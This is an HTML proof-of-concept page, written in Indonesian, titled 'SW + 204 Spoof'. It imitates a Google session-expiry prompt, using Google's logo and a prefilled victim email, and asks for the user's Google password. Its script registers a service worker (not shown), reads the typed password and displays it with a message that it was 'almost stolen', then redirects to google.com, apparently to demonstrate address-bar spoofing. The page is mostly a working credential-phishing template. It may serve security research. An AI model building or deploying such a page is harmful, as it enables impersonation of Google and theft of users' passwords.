<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC Kompleks: SW + 204 Spoof</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background: #f0f2f5;
        }

        #login-form {
            width: 100%;
            max-width: 400px;
            padding: 40px;
            background: #fff;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        img.logo {
            width: 75px;
            margin-bottom: 20px;
        }

        h2 {
            font-weight: 500;
            margin-bottom: 10px;
            color: #202124;
        }

        p {
            color: #5f6368;
            margin-bottom: 30px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-weight: 500;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background: #1769d4;
        }

        #log {
            margin-top: 20px;
            font-size: 12px;
            color: grey;
        }
    </style>
</head>

<body>

    <div id="login-form">
        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
            alt="Google">
        <h2>Verifikasi Sesi</h2>
        <p>Sesi Google Anda telah kedaluwarsa. Silakan masukkan kembali kata sandi Anda untuk melanjutkan.</p>
        <input type="text" placeholder="Email (diisi otomatis oleh Google)" disabled value="korban@email.com">
        <input type="password" placeholder="Kata Sandi Google Anda">
        <button id="submit-btn" onclick="executeComplexSpoof()">Verifikasi dan Login</button>
        <p id="log">Status SW: <span id="sw-status">Memeriksa...</span></p>
    </div>

    <script>
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('./sw.js')
                .then(function (registration) {
                    document.getElementById('sw-status').innerText = 'Aktif ✅';
                    document.getElementById('sw-status').style.color = 'green';
                })
                .catch(function (error) {
                    document.getElementById('sw-status').innerText = 'Gagal ❌: ' + error.message;
                    document.getElementById('sw-status').style.color = 'red';
                });
        } else {
            document.getElementById('sw-status').innerText = 'Browser tidak support SW ❌';
            document.getElementById('sw-status').style.color = 'red';
        }
        function executeComplexSpoof() {
            if (!navigator.serviceWorker.controller) {
                alert("Service Worker belum aktif. Silakan refresh.");
                return;
            }
            let pwd = document.querySelector('input[type="password"]').value;
            if (pwd) alert("Kredensial Anda (HAMPIR) dicuri: " + pwd + ". Sekarang perhatikan address bar...");
            document.getElementById('submit-btn').innerText = 'Memverifikasi...';
            window.location.href = "https://www.google.com/";
        }
    </script>

</body>

</html>
